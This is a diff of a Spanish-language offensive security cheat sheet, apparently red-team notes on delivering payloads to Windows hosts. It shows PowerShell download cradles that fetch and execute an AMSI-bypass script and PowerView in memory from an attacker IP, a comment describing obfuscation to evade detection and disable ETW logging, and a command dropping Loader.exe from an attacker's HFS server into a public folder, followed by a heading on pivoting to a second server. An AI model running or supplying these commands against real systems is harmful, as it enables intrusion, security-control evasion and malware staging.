@@ -16,14 +16,14 @@ Paso 3:
 ❯ iex (New-Object System.NET.WebClient).DownloadString('http://IP_Atacante/Amsi-Byp.txt')  
 # Ejecuta un payload PowerShell extremadamente ofuscado y codificado en Base64 para evadir detección, deshabilitar telemetría/logging ETW y ejecutar comandos dinámicamente en memoria sin tocar disco. Bypass AMSI
 
-Paso 4:
 ❯ iex (New-Object System.NET.WebClient).DownloadString('http://IP_Atacante/PowerView.ps1')
-# Descargar PowerView
+# Descargar PowerView en memoria 
 
-Invoke-WebRequest -Uri "http://<IP-de-tu-HFS>:8080/Loader.exe" -OutFile "C:\Users\Public\Loader.exe"
+❯ Invoke-WebRequest -Uri "http://<IP-de-tu-HFS>:8080/Loader.exe" -OutFile "C:\Users\Public\Loader.exe"
+# Otra forma de descargar en disco 
 ```
 
-## Transferir hacia un segundo server utilizando el primer server como pivote 
+## Transferir hacia un segundo server utilizando el primer server como Pivote 
 
 ```powershell 
 Paso 1:
